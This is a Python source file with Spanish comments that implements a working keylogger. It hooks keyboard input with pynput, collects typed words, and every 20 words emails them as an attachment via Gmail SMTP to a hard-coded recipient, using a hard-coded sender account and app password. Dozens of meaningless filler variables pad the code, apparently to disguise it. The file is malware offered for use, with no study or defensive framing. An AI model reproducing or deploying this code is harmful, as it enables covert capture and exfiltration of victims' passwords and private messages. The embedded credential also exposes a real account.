from pynput import keyboard
import string
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

rd= 444
puerto= 55
tr= "como estas" 

def crear(texto):
    m = MIMEMultipart()
    m['From'] = "jm2077rtx@gmail.com" # correo emisor
    m['To'] = "davidsenyi4@gmail.com" # correo receptor
    m['Subject'] = "Palabras registradas" # asunto del correo
    
    with open("archivo.txt", "w") as archivo:
        archivo.write(texto)
    
    with open("archivo.txt", "rb") as archivo:
        adjunto = MIMEApplication(archivo.read(), _subtype="txt")
        adjunto.add_header('Content-Disposition', 'attachment', filename="archivo.txt")
        m.attach(adjunto)
    
    servidormail = smtplib.SMTP("smtp.gmail.com", 587)
    servidormail.ehlo()
    servidormail.starttls()
    servidormail.ehlo()
    servidormail.login('jm2077rtx@gmail.com', 'avhhvrsukwhsnlhz') # (correo de envío, contraseña) 
    # debe ser un correo propio y la contraseña debe ser una de desarrollo generada en la administración de la cuenta
    servidormail.sendmail('jm2077rtx@gmail.com', 'davidsenyi4@gmail.com', m.as_string()) # (correo emisor, correo receptor, msg.as_string())
    servidormail.quit()

valoresmen = set(string.printable + "\n\r\t" + "".join(chr(i) for i in range(32, 127)))

pvalor = "" # palabra
cant = 0    # cantidad
lista = [] # lista 
variable1 = 10
variable2 = "Hola"
variable3 = 3.14
variable4 = True
variable5 = [1, 2, 3]
variable6 = None
variable7 = "Mundo"
variable8 = 5.6
variable9 = False


def presionadas(boton):
    global pvalor, cant, lista
    
    try:
        valores = boton.char
    except:
        valores = str(boton)
     
    drer=4555
    hola= "hola mundo"
    el= 333 
    rtx= 4090
    
    if boton == keyboard.Key.space:
        pvalor = pvalor.strip()
        if len(pvalor) > 0:
            cant += 1
            lista.append(pvalor)
            pvalor = ""
        if cant % 20 == 0:
            print("Palabras registradas:")
            print(", ".join(lista))
            crear(", ".join(lista))
            lista = []
    elif valores in valoresmen:
        pvalor += valores
        
        
    rrr=5667
    t= "esto es un programa de prueba"

with keyboard.Listener(on_press=presionadas) as listener:
    listener.join()
    
xd= "13323"
ddd= 3
dd= 4
ee= 5
rrr= 10
variable10 = (1, 2, 3)
variable11 = "Python"
variable12 = 42
variable13 = [4, 5, 6]
variable14 = 2.71828
variable15 = "Hola, mundo!"
variable16 = ["a", "b", "c"]
variable17 = {"nombre": "Juan", "edad": 25}
variable18 = 7
variable19 = 3.14159
variable20 = [7, 8, 9]
variable21 = True
variable22 = "Adiós"
variable23 = None
variable24 = 9.8
variable25 = False
variable26 = (4, 5, 6)
